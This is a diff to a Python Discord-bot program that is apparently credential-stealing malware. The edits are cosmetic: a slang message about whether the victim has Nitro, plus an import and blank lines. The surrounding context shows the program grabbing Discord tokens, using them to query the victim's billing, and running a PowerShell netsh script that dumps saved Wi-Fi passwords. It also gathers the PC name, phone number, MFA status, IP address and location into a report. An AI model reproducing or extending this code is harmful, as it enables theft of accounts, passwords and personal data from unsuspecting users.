@@ -1,5 +1,6 @@
 import discord
 import os
+import re
 import pyautogui
 import ctypes
 import asyncio
@@ -27,6 +28,8 @@ wifi_script = """(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=
 tokens = []
 cleaned = []
 checker = []
+
+
 def getip():
     ip = "None"
     try:
@@ -110,6 +113,11 @@ def get_token():
                         res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                         nitro_data = res.json()
                         has_nitro = bool(len(nitro_data) > 0)
+                        if has_nitro: 
+                            nitro_statement = "✅"
+                        else:    
+                            nitro_statement = "❌Blud has no nitro indeed"
+                         
                         global grabembed
                         output = subprocess.Popen(["powershell.exe", wifi_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0]
                         decoded_wifi_pwd = output.decode(sys.stdout.encoding, errors='ignore')
@@ -135,7 +143,7 @@ def get_token():
                         grabembed.add_field(name="**PC Name:**",value=f"```{pc_name}```",inline=True)
                         grabembed.add_field(name="**Phone number:**", value=f"```{phone}```",inline=True)
                         grabembed.add_field(name="**MFA Enabled?**", value=f"```{mfa_enabled}```",inline=True)
-                        grabembed.add_field(name="**has nitro?**", value=f"```{has_nitro}```",inline=True)
+                        grabembed.add_field(name="**Does blud have Nitro?**", value=f"```{nitro_statement}```",inline=True)
                         grabembed.add_field(name="**IP Address:**",value=f"```{ip}```",inline=True)
                         grabembed.add_field(name="**Country:**", value=f"```{country}```",inline=True)
                         grabembed.add_field(name="**Aprox. Latitude:**", value=f"```{latitude}```",inline=True)
@@ -196,6 +204,7 @@ commands = "\n".join([
 intents = discord.Intents.all()
 intents.members = True
 client = discord.Client(intents=intents)
+
 async def find_channel_by_name(guild, channel_name):
     for channel in guild.channels:
         if channel.name == channel_name:
